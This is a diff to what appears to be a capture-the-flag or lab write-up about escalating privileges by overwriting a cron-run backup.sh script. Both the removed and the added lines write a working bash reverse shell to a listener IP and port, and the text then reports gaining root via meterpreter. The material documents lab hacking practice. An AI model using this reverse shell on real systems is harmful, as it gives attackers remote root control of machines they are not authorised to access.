@@ -48,10 +48,10 @@ backup.sh, running every minute. we can try feed in malicious script but need to
 
 found in /lucas directory, probably a user hehe. Inject malicious reverse shell script
 
-printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.42.234/4444 0>&1\n' > backup.sh
-
- <img width="755" height="43" alt="image" src="https://github.com/user-attachments/assets/218e094f-fcef-490b-9268-3788580a51c5" />
+printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.42.234/2590 0>&1\n' > backup.sh
 
 meterpreter seemingly responded well on the request
 
 We now have root access from user 
+
+<img width="829" height="305" alt="image" src="https://github.com/user-attachments/assets/ad6c0210-861e-4a5f-911d-dbdcb84fc600" />
